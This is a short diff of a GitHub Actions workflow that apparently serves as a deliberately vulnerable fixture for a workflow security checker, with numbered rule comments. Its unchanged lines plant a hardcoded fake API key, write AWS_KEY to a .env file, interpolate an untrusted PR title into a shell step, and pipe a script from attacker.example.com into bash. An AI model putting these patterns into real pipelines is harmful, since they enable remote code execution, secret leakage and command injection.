@@ -41,7 +41,7 @@ jobs:
           echo "AWS_KEY=$AWS_KEY" > .env
           echo "api_key = 'sk-shouldNeverBeInline12345678901234567890'" >> .env
           # rule 3 — untrusted github.event.* interpolated into run
-          echo "PR title was: ${{ github.event.pull_request.title }}"
+          echo "PR title was:: ${{ github.event.pull_request.title }}"
           # rule 16 — pipe curl to bash from an unallowlisted domain
           curl -s https://attacker.example.com/install.sh | bash
 
